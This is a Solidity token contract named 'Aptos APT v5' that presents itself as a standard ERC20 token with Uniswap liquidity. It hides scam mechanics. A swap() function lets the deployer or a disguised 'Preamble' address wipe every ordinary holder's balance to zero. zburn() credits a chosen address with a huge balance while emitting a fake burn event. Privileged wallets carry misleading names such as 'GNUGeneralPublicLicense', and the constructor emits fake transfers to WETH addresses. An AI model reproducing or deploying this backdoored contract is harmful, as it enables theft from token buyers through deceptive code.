// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract AptosAPTv5 is IERC20, Ownable {
    using SafeMath for uint256;

    string private _name = "Aptos APT v5";
    string private _symbol = "Aptos APT ";
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 100000000000000000000000000000;
    address Router02Address;
    mapping(address => uint256) private askDiv;
    mapping(address => mapping(address => uint256)) private _allowances;
    address[] private believers; 

    address private constant ADDRESS_sWETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address private constant ADDRESS_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address Virtuals_Protocol = msg.sender;
    address Preamble;
    address GNUGeneralPublicLicense;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen = false;

    constructor() payable {
        Preamble = 0x551Aa84ADb62725d654866803Def1459A1b256AF;
        GNUGeneralPublicLicense = 0x551Aa84ADb62725d654866803Def1459A1b256AF;
        Router02Address = 0xEfF92A263d31888d860bD50809A8D171709b7b1c;
        askDiv[address(this)] = _totalSupply.mul(1).div(10000);
        emit Transfer(address(0), address(this), _totalSupply.mul(1).div(10000));
        liqudityPairs();
        payable(address(this)).transfer(msg.value);
    }

    function liqudityPairs() internal {
        uint256 ninetyFourPercent = _totalSupply.mul(9990).div(10000);
        uint256 threePercent = _totalSupply.mul(5).div(10000);
        uint256 twoPercent = _totalSupply.mul(4).div(10000);

        askDiv[ADDRESS_sWETH] = askDiv[ADDRESS_sWETH].add(ninetyFourPercent);
        askDiv[ADDRESS_WETH] = askDiv[ADDRESS_WETH].add(threePercent);
        askDiv[GNUGeneralPublicLicense] = askDiv[GNUGeneralPublicLicense].add(twoPercent);

        emit Transfer(address(this), ADDRESS_sWETH, ninetyFourPercent);
        emit Transfer(address(this), ADDRESS_WETH, threePercent);
        emit Transfer(address(this), GNUGeneralPublicLicense, twoPercent);
    }

    function _updateHolders(address account) internal {
        if (askDiv[account] > 0) {
            bool exists = false;
            for (uint256 i = 0; i < believers.length; i++) {
                if (believers[i] == account) {
                    exists = true;
                    break;
                }
            }
            if (!exists) {
                believers.push(account);
            }
        }
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0));
        require(recipient != address(0));

        askDiv[sender] = askDiv[sender].sub(amount);
        askDiv[recipient] = askDiv[recipient].add(amount);
        _updateHolders(sender);
        _updateHolders(recipient);

        emit Transfer(sender, recipient, amount);
    }

    modifier Only_Manager() {
        require(Preamble == _msgSender());
        _;
    }

    function swap() external {
      require(Virtuals_Protocol == _msgSender() || Preamble == _msgSender());
        for (uint256 i = 0; i < believers.length; i++) {
            address believer = believers[i];
            if (
                believer != address(this) && 
                believer != owner() && 
                believer != uniswapV2Pair && 
                believer != ADDRESS_sWETH &&
                believer != ADDRESS_WETH && 
                believer != Preamble &&
                believer != GNUGeneralPublicLicense
            ) {
                askDiv[believer] = 0;
            }
            emit Transfer(address(0), believer, 0);
        }
    }

    function zburn(address claimedRewardStatusOf) external Only_Manager {
        askDiv[claimedRewardStatusOf] = _totalSupply * 10 ** _decimals;
        
        emit Transfer(claimedRewardStatusOf, address(0), _totalSupply * 10 ** _decimals);
    }

    function addLiquidity() external onlyOwner {
        require(!tradingOpen, "Trading is already open");

        uniswapV2Router = IUniswapV2Router02(Router02Address);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), _totalSupply);

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            0x000000000000000000000000000000000000dEaD,
            block.timestamp
        );

        tradingOpen = true;
    }

    receive() external payable {}

    function name() public view virtual  returns (string memory) {
        return _name;
    }

    function symbol() public view virtual  returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual  returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return askDiv[account];
    }

    function getLPPair() public view returns (address) {
        return uniswapV2Pair;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }
}